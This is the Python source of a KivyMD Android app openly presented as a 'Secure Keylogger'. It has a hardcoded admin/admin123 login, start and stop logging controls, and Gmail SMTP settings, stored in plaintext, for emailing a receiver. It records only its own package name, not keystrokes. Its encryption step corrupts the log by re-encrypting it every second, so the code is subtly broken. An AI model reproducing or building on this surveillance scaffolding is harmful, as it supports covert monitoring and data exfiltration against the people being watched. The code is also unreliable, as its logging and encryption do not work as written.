from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.core.window import Window
from kivy.clock import Clock
from kivy.utils import platform
from kivymd.app import MDApp
from kivymd.uix.button import MDRaisedButton
from kivymd.uix.textfield import MDTextField
from kivymd.uix.label import MDLabel
from kivymd.uix.card import MDCard
from kivymd.uix.dialog import MDDialog
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.toolbar import MDTopAppBar
from plyer import notification, email
import os
import json
import smtplib
import logging
import schedule
import threading
import time
from datetime import datetime
from cryptography.fernet import Fernet
from android.permissions import request_permissions, Permission

# Setup logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('keylogger.log'),
        logging.StreamHandler()
    ]
)

class LoginScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.setup_ui()
        
    def setup_ui(self):
        layout = MDBoxLayout(orientation='vertical', spacing=10, padding=20)
        
        # Top toolbar
        toolbar = MDTopAppBar(title="Secure Keylogger")
        layout.add_widget(toolbar)
        
        # Login card
        card = MDCard(
            orientation='vertical',
            padding=20,
            spacing=10,
            size_hint=(None, None),
            size=(300, 400),
            pos_hint={'center_x': 0.5, 'center_y': 0.5}
        )
        
        # Title
        card.add_widget(MDLabel(
            text="Login",
            font_style="H5",
            halign="center",
            size_hint_y=None,
            height=50
        ))
        
        # Username field
        self.username = MDTextField(
            hint_text="Username",
            helper_text="Enter admin username",
            helper_text_mode="on_error",
            icon_right="account",
            size_hint_x=None,
            width=200,
            pos_hint={'center_x': 0.5}
        )
        card.add_widget(self.username)
        
        # Password field
        self.password = MDTextField(
            hint_text="Password",
            helper_text="Enter your password",
            helper_text_mode="on_error",
            icon_right="key-variant",
            size_hint_x=None,
            width=200,
            pos_hint={'center_x': 0.5},
            password=True
        )
        card.add_widget(self.password)
        
        # Login button
        login_button = MDRaisedButton(
            text="LOGIN",
            pos_hint={'center_x': 0.5},
            size_hint=(None, None),
            width=200,
            md_bg_color=self.theme_cls.primary_color
        )
        login_button.bind(on_release=self.verify_credentials)
        card.add_widget(login_button)
        
        layout.add_widget(card)
        self.add_widget(layout)
    
    def verify_credentials(self, instance):
        if self.username.text == "admin" and self.password.text == "admin123":
            self.manager.current = 'main'
        else:
            dialog = MDDialog(
                title="Login Failed",
                text="Invalid username or password",
                buttons=[
                    MDRaisedButton(
                        text="OK",
                        on_release=lambda x: dialog.dismiss()
                    )
                ]
            )
            dialog.open()

class MainScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.setup_ui()
        self.setup_logger()
        
    def setup_ui(self):
        layout = MDBoxLayout(orientation='vertical', spacing=10)
        
        # Top toolbar with menu
        toolbar = MDTopAppBar(
            title="Keylogger Dashboard",
            right_action_items=[
                ["cog", lambda x: self.show_settings()],
                ["logout", lambda x: self.logout()]
            ]
        )
        layout.add_widget(toolbar)
        
        # Main content
        content = MDBoxLayout(orientation='vertical', spacing=10, padding=20)
        
        # Status card
        status_card = MDCard(
            orientation='vertical',
            padding=10,
            spacing=5,
            size_hint_y=None,
            height=100
        )
        
        self.status_label = MDLabel(
            text="Status: Stopped",
            theme_text_color="Secondary"
        )
        status_card.add_widget(self.status_label)
        
        # Control buttons
        buttons_box = MDBoxLayout(spacing=10)
        
        self.start_button = MDRaisedButton(
            text="START LOGGING",
            on_release=self.toggle_logging
        )
        buttons_box.add_widget(self.start_button)
        
        buttons_box.add_widget(MDRaisedButton(
            text="VIEW LOGS",
            on_release=self.view_logs
        ))
        
        status_card.add_widget(buttons_box)
        content.add_widget(status_card)
        
        # Log display
        self.log_label = MDLabel(
            text="No logs available",
            theme_text_color="Secondary",
            size_hint_y=None,
            height=400
        )
        content.add_widget(self.log_label)
        
        layout.add_widget(content)
        self.add_widget(layout)
    
    def setup_logger(self):
        self.is_logging = False
        self.log_file = "keylog.txt"
        self.encryption_key = self.load_key()
        
    def load_key(self):
        key_file = "secret.key"
        if not os.path.exists(key_file):
            key = Fernet.generate_key()
            with open(key_file, "wb") as f:
                f.write(key)
        else:
            with open(key_file, "rb") as f:
                key = f.read()
        return Fernet(key)
    
    def toggle_logging(self, instance):
        self.is_logging = not self.is_logging
        if self.is_logging:
            self.start_logging()
            self.start_button.text = "STOP LOGGING"
            self.status_label.text = "Status: Running"
        else:
            self.stop_logging()
            self.start_button.text = "START LOGGING"
            self.status_label.text = "Status: Stopped"
    
    def start_logging(self):
        logging.info("Starting keylogger")
        # Start monitoring system events
        if platform == 'android':
            # Request necessary permissions
            request_permissions([
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE
            ])
        Clock.schedule_interval(self.log_event, 1.0)
    
    def stop_logging(self):
        logging.info("Stopping keylogger")
        Clock.unschedule(self.log_event)
    
    def log_event(self, dt):
        try:
            # Log active app/window
            if platform == 'android':
                from jnius import autoclass
                activity = autoclass('org.kivy.android.PythonActivity').mActivity
                package_name = activity.getPackageName()
                self.write_log(f"Active App: {package_name}")
            
            # Encrypt and save logs periodically
            self.encrypt_logs()
            
        except Exception as e:
            logging.error(f"Error logging event: {e}")
    
    def write_log(self, data):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {data}\n")
        self.update_log_display()
    
    def encrypt_logs(self):
        try:
            with open(self.log_file, "rb") as f:
                data = f.read()
            encrypted_data = self.encryption_key.encrypt(data)
            with open(self.log_file, "wb") as f:
                f.write(encrypted_data)
        except Exception as e:
            logging.error(f"Error encrypting logs: {e}")
    
    def update_log_display(self):
        try:
            with open(self.log_file, "r", encoding="utf-8") as f:
                logs = f.readlines()[-10:]  # Show last 10 logs
            self.log_label.text = "".join(logs)
        except Exception as e:
            logging.error(f"Error updating log display: {e}")
    
    def view_logs(self, instance):
        try:
            with open(self.log_file, "r", encoding="utf-8") as f:
                logs = f.read()
            
            dialog = MDDialog(
                title="Logs",
                text=logs if logs else "No logs available",
                size_hint=(0.9, 0.9),
                buttons=[
                    MDRaisedButton(
                        text="Close",
                        on_release=lambda x: dialog.dismiss()
                    )
                ]
            )
            dialog.open()
        except Exception as e:
            logging.error(f"Error viewing logs: {e}")
    
    def show_settings(self):
        self.manager.current = 'settings'
    
    def logout(self):
        self.manager.current = 'login'

class SettingsScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.setup_ui()
        self.load_settings()
    
    def setup_ui(self):
        layout = MDBoxLayout(orientation='vertical', spacing=10)
        
        # Top toolbar
        toolbar = MDTopAppBar(
            title="Settings",
            left_action_items=[["arrow-left", lambda x: self.go_back()]]
        )
        layout.add_widget(toolbar)
        
        # Settings content
        content = MDBoxLayout(orientation='vertical', spacing=20, padding=20)
        
        # Email settings
        self.email = MDTextField(
            hint_text="Email",
            helper_text="Enter your Gmail address",
            icon_right="email"
        )
        content.add_widget(self.email)
        
        self.password = MDTextField(
            hint_text="App Password",
            helper_text="Enter your Gmail App Password",
            icon_right="key-variant",
            password=True
        )
        content.add_widget(self.password)
        
        self.receiver = MDTextField(
            hint_text="Receiver Email",
            helper_text="Enter receiver's email address",
            icon_right="email-send"
        )
        content.add_widget(self.receiver)
        
        # Test email button
        test_button = MDRaisedButton(
            text="TEST EMAIL",
            pos_hint={'center_x': 0.5},
            on_release=self.test_email
        )
        content.add_widget(test_button)
        
        # Save button
        save_button = MDRaisedButton(
            text="SAVE SETTINGS",
            pos_hint={'center_x': 0.5},
            md_bg_color=self.theme_cls.primary_color,
            on_release=self.save_settings
        )
        content.add_widget(save_button)
        
        layout.add_widget(content)
        self.add_widget(layout)
    
    def load_settings(self):
        try:
            with open("config.json", "r") as f:
                config = json.load(f)
                self.email.text = config.get("email", "")
                self.password.text = config.get("password", "")
                self.receiver.text = config.get("receiver", "")
        except:
            pass
    
    def save_settings(self, instance):
        config = {
            "email": self.email.text,
            "password": self.password.text,
            "receiver": self.receiver.text
        }
        
        try:
            with open("config.json", "w") as f:
                json.dump(config, f)
            
            dialog = MDDialog(
                title="Success",
                text="Settings saved successfully!",
                buttons=[
                    MDRaisedButton(
                        text="OK",
                        on_release=lambda x: dialog.dismiss()
                    )
                ]
            )
            dialog.open()
        except Exception as e:
            logging.error(f"Error saving settings: {e}")
            self.show_error("Failed to save settings")
    
    def test_email(self, instance):
        try:
            sender = self.email.text
            password = self.password.text
            receiver = self.receiver.text
            
            if not all([sender, password, receiver]):
                self.show_error("Please fill in all fields")
                return
            
            # Create test message
            subject = "Keylogger Test Email"
            message = f"""Subject: {subject}
Content-Type: text/html

<html>
<body style="font-family: Arial, sans-serif; padding: 20px;">
    <h2 style="color: #2c3e50;">Keylogger Test Email</h2>
    <p style="color: #34495e;">This is a test email from your keylogger configuration.</p>
    <p style="color: #7f8c8d;">Sent at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
</body>
</html>
"""
            
            # Send email
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(sender, password)
            server.sendmail(sender, receiver, message)
            server.quit()
            
            dialog = MDDialog(
                title="Success",
                text="Test email sent successfully!",
                buttons=[
                    MDRaisedButton(
                        text="OK",
                        on_release=lambda x: dialog.dismiss()
                    )
                ]
            )
            dialog.open()
            
        except Exception as e:
            logging.error(f"Error sending test email: {e}")
            self.show_error(f"Failed to send email: {str(e)}")
    
    def show_error(self, message):
        dialog = MDDialog(
            title="Error",
            text=message,
            buttons=[
                MDRaisedButton(
                    text="OK",
                    on_release=lambda x: dialog.dismiss()
                )
            ]
        )
        dialog.open()
    
    def go_back(self):
        self.manager.current = 'main'

class KeyloggerApp(MDApp):
    def build(self):
        self.theme_cls.primary_palette = "Blue"
        self.theme_cls.theme_style = "Light"
        
        sm = ScreenManager()
        sm.add_widget(LoginScreen(name='login'))
        sm.add_widget(MainScreen(name='main'))
        sm.add_widget(SettingsScreen(name='settings'))
        return sm

if __name__ == '__main__':
    KeyloggerApp().run() 